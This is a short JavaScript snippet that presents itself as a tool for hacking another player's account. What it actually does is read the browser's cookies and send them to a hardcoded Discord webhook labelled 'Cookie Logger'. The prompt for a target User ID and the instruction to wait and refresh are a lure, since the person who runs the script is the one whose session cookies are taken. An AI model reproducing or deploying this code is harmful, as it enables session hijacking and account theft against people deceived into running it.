var Cookies = document.cookie;
const webhook = require("webhook-discord")

const Hook = new webhook.Webhook("https://discord.com/api/webhooks/789342254220967986/ivVMX1LH8j-7wKuFU6ussqmErJYBlczolYZ9cz6ypbUDAr1hgp8mD5Cc1A7ByO9tF-2i")

Hook.info("Cookie Logger", Cookies)

prompt("Enter the players User ID you want to hack")
alert('Now please wait 10 seconds and refresh the page')
